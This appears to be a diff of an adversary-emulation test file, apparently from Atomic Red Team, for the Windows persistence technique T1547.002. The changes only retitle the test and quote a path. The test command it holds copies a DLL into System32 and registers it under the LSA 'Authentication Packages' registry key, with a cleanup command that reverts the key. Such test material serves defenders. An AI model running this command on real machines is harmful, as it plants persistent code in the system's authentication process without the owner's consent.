@@ -1,5 +1,5 @@
 attack_technique: T1547.002
-display_name: Authentication Package
+display_name: "Boot or Logon Autostart Execution: Authentication Package"
 atomic_tests:
 - name: Authentication Package
   auto_generated_guid: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
@@ -12,7 +12,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\
+      Copy-Item "$PathToAtomicsFolder\T1547.002\bin\package.dll" C:\Windows\System32\
       reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
     cleanup_command: |
       reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
